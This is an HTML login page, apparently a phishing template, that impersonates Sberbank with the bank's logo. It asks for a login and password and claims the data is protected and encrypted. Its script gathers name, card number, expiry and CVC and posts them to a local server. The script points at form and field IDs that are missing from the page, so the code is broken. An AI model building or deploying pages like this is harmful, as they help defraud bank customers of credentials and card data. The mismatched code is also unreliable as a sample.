<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Форма авторизации</title>
    <link rel="stylesheet" href="style.css" />
    <style>
      body {
        font-family: 'Arial', sans-serif;
        background-color: #f7f7f7;
        margin: 0;
        padding: 0;
      }

      .auth-container {
        max-width: 400px;
        margin: 100px auto;
        padding: 20px;
        background-color: white;
        border-radius: 8px;
        box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      }

      .logo {
        display: flex;
        justify-content: center;
        margin-bottom: 20px;
      }

      .logo img {
        width: 120px;
      }

      h2 {
        color: #333;
        text-align: center;
      }

      .form-section {
        margin-bottom: 20px;
      }

      label {
        font-size: 14px;
        color: #333;
        margin-bottom: 5px;
        display: block;
        font-weight: bold;
      }

      input {
        width: 100%;
        padding: 10px;
        margin-top: 5px;
        margin-bottom: 10px;
        border: 1px solid #d9d9d9;
        border-radius: 4px;
        font-size: 14px;
        box-sizing: border-box;
        background-color: #f9f9f9;
        transition: border-color 0.3s ease;
      }

      input:focus {
        border-color: #3dbf8e;
        outline: none;
      }

      .submit-button {
        background-color: #3dbf8e;
        color: white;
        padding: 12px;
        font-size: 16px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        transition: background-color 0.3s ease;
        width: 100%;
      }

      .submit-button:hover {
        background-color: #35a880;
      }

      .disclaimer {
        text-align: center;
        font-size: 12px;
        color: #666;
        margin-top: 10px;
      }

      @media (max-width: 600px) {
        .auth-container {
          margin: 20px;
        }
      }
    </style>
  </head>
  <body>
    <div class="auth-container">
      <div class="logo">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Sberbank_Logo_2020.svg/2560px-Sberbank_Logo_2020.svg.png"
          alt="Логотип Сбербанка"
        />
      </div>

      <h2>Авторизация</h2>
      <form id="auth-form">
        <div class="form-section">
          <label for="username">Логин:</label>
          <input
            type="text"
            id="username"
            name="username"
            placeholder="Введите ваш логин"
            required
          />

          <label for="password">Пароль:</label>
          <input
            type="password"
            id="password"
            name="password"
            placeholder="Введите ваш пароль"
            required
          />
        </div>

        <button type="submit" class="submit-button">Войти</button>
      </form>

      <p class="disclaimer">Ваши данные защищены и шифруются.</p>
    </div>

    <script>
      document
        .getElementById('payment-form')
        .addEventListener('submit', async function (event) {
          event.preventDefault();
          const formData = {
            firstName: document.getElementById('firstName').value,
            lastName: document.getElementById('lastName').value,
            cardNumber: document.getElementById('cardNumber').value,
            cardExpiry: document.getElementById('cardExpiry').value,
            cardCvc: document.getElementById('cardCvc').value,
          };

          try {
            const response = await fetch(
              'http://localhost:3002/submit-payment',
              {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData),
              },
            );
            const result = await response.text();
            alert(result);
          } catch (error) {
            console.error('Error:', error);
          }
        });
    </script>
  </body>
</html>
